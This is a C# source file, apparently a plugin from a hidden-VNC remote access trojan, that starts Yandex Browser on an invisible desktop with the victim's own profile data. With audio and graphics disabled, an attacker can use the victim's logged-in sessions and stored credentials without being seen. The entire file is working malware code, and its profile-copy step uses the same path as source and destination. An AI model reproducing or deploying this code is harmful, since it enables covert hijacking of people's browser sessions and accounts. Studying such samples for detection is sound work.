using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.Devices;

namespace Plugin.Helper.OpenApp;

internal class Yandex
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data";

	private static readonly string FilenameYandex = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\Application\\browser.exe";

	public static void OpenYandexBrowser()
	{
		HideDesktop.Load(Plugin.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameYandex))
			{
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					((ServerComputer)PC).FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(Plugin.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			Client.Error("Yandex: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameYandex))
			{
				text = FilenameYandex;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --mute-audio --disable-audio --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("Yandex: " + ex.Message);
		}
	}
}
